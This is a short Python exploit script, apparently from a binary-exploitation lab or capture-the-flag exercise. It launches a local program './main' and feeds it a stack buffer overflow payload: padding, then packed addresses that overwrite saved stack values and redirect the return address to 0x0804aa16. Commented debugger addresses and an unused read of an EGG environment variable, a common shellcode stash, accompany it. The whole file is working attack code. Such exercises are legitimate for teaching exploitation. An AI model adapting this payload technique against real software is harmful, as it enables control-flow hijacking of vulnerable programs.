import subprocess, os
os.environb.get(b'EGG')
p = subprocess.Popen(['./main'],stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE,shell=True)
#0x0804ab74
#0804ab74
#0x0804aad6
#0x0804aa16
#0x51e73aa9      0xb7fff918      0xbffff748
l = [b"a" * (16)+ b"\xa9\x3a\xe7\x51" + b"\x18\xf9\xff\xb7" + b"\x48\xf7\xff\xbf"  + b"\x16\xaa\x04\x08" + b"\n"]
sout, serr = p.communicate(input=b"".join(l))
print('STDOUT: ' + str(sout,encoding="utf8"))
print('STDERR: ' + str(serr,encoding="utf8"))
print(p.returncode)
